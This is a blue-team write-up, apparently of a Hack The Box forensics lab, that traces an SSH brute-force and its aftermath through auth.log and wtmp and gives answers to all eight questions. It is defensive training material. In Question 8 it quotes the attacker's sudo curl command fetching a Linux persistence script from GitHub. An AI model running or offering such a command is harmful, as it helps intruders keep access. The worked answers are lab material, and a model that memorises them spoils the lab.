---
title: "Hackthebox Brutus Sherlock"
date: 2025-02-05
media_subpath: /assets/posts/2025-02-05-hackthebox-brutus-sherlock
published: false
layout: post
categories:
- ctf
- blue team
tags:
- linux
---

To begin the sherlock we are given the following scenario:  

"In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution."

We are also given two different kinds of linux log files, `auth.log` and `wtmp`. A quick google search or ChatGPT reveals which kind of information these log files give us:  

**auth.log**  
- Stores authentication logs for both successful or failed logins, and authentication processes 
- Text file.  


**wtmp**  
- Keeps track of historical data of every log-in and logout activity in the form of a binary, the historic data of the `utmp` file which stores logs about the current session.  
- Since it's in the form of a binary file, need to use tools like `utmpdump` or `last` to view it.

### Question 1

**Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**

During a brute force attack there will almost definetly be a large number of failed attempts and scrolling through `auth.log`, when these failed attempts occur an event containing "Failed password" is logged. We can grep for "Failed password" to get the answer.  

`grep "Failed password" auth.log`  

From this we get the following output  

![brutus_q1_output_1.png](brutus_q1_output_1.png)  

Revealing the answer to be `65.2.161.68`  

### Question 2

**The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**  

To find out what is logged after a successful login attempt we can try grep again for "password". This shows that "Accepted password" is logged on successful authentication attemps.  

Now using the following command to find successful login attempts:  

`grep "Accepted password"`  

This gives the following output:

![brutus_q2_output_1.png](brutus_q2_output_1.png)  

We know the malicious ip, which gives us the answer "root"

### Question 3

**Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**  

We know the attacker gained first gained access on `Mar  6 06:31:40` from the previous questions, now its important to know the difference between `wtmp` and `auth.log` log files. Both store logs related to authentication but `wtmp` will store timestamps of when sessions were created. This is important because we want to find when the attacker manually logged in. Looking at the accepted passwords logs from `auth.log` reveals the first two accepted passwords for root were at `Mar  6 06:31:40` and `Mar  6 06:32:44` but when analysing the `wtmp` file using the following command:

`utmpdump wtmp`  

We get the output:  

![brutus_q3_output_1.png](brutus_q3_output_1.png)  

Which tells us the first session was established at `2024-03-06T06:32:45`. Why was there a session established for the successful authentication attempt at `Mar  6 06:32:44` but not at `Mar  6 06:31:40`? Because the first successful authentication attempt was during the brute-force attack so it didn't bother establishing a session. Therefore our answer is `2024-03-06 06:32:45`  

### Question 4

**SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**  

the `wtmp` file stores details about the session but not the ID which we know by looking at the output from `utmpdump`. So the answer must be in `auth.log`. We can look at the logs surrounding the successful authentication attempt from Question 2 using sed:  

`sed -n "320,330p" auth.log`  

Which shows us:  

![brutus_q4_output_1.png](brutus_q4_output_1.png)  

Giving us the answer 37  

### Question 5

**The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**  

Again we know the details of `wtmp` won't contain our answer here so we must look in `auth.log`. We know if a user was created on the linux machines commands like `useradd` or `adduser` would likely have been used. We can grep for these commands:  

`grep "useradd" auth.log`  

Which shows  

![brutus_q5_output_1.png](brutus_q5_output_1.png)  

Giving us the answer "cyberjunkie"

### Question 6  

**What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**  

This answer can be found by a google search like "MITRE ID persistence by creating new account" and from the MITRE ATT&CK page for `T1136` we get the sub technique for creating a new local account, `T1136.001`.  

### Question 7  

**What time did the attacker's first SSH session end according to auth.log?**  

The question already tells us were looking in auth.log, we know the session id is 37, we can grep for this:  

`grep "session 37" auth.log`  

Which gives us:  

![brutus_q7_output_1.png](brutus_q7_output_1.png)  

So the answer is `2024-03-06 06:37:24`  

### Question 8  

**The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**  

the `sudo` command which the attacker used is a command which requires authentication. Again from looking at the `utmpdump wtmp` output from question 3 it doesn't look like our answer is here so were looking at `auth.log` for the answer. We know the command executed contained `sudo` so grepping for `sudo`:  

`grep "sudo" auth.log`  

We get:  

![brutus_q8_output_1.png](brutus_q8_output_1.png)  

Giving us the answer `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`  

### Review / Skills learned  

This lab was very easy and straightforward, all the knowledge that was required was basic linux skills with a little bit of problem solving.




